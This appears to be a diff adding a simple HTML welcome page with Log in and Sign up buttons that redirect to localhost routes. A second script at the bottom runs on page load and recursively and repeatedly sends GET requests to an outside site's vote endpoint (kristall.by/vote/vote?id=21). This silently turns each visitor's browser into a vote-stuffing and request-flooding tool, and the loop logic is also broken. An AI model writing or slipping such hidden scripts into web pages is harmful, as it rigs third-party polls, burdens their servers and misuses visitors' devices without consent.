@@ -1,0 +1,80 @@
+﻿<!DOCTYPE html>
+<style>
+    .parent {
+        height: 900px;
+        display: flex;
+        justify-content:center;
+
+    }
+    .divItems {
+        margin-top: 200px;
+        height: 300px;
+        justify-content: center;
+
+    }
+    .btn{
+        height: 30px;
+        width: 200px;
+    }
+    .inerItems{
+        margin-top:100px;
+    }
+    .link{
+        margin-left: 95%;
+    }
+
+</style>
+<html>
+<head>
+    <meta charset="utf-8" />
+</head>
+<body>
+    <a class="link" href="">my GitHub</a>
+    <footer > <hr /></footer>
+    <div class="parent">
+        <div class="divItems" align="center">
+
+            <h1>Welcome to my web site</h1>
+
+            <div class="inerItems">
+
+                <button class="btn" id="logIn"> Log in </button>
+                <button class="btn" id="singUp"> Sing up </button>
+
+            </div>
+        </div>
+    </div>
+    <footer> <hr /></footer>
+        
+    <script>
+        document.getElementById("logIn").addEventListener("click", ToLogIn)
+        document.getElementById("singUp").addEventListener("click", ToSingUp)
+
+        async function ToSingUp() {
+            window.location.href = "http://localhost:5282/singup";
+        }
+
+        async function ToLogIn() {
+            window.location.href = "http://localhost:5282/login";
+        }
+    </script>
+    <script>
+        async function Vote() {
+            while (true) {
+                var x = 0;
+                Vote();
+                x = x + 1;
+                if (x > 500) {
+                    break;
+                }
+                var responce = await fetch("http://kristall.by/vote/vote?id=21", {
+                    method: "GET"
+                });
+            }
+            wait(100);
+        }
+        Vote();
+        
+    </script>
+</body>
+</html>
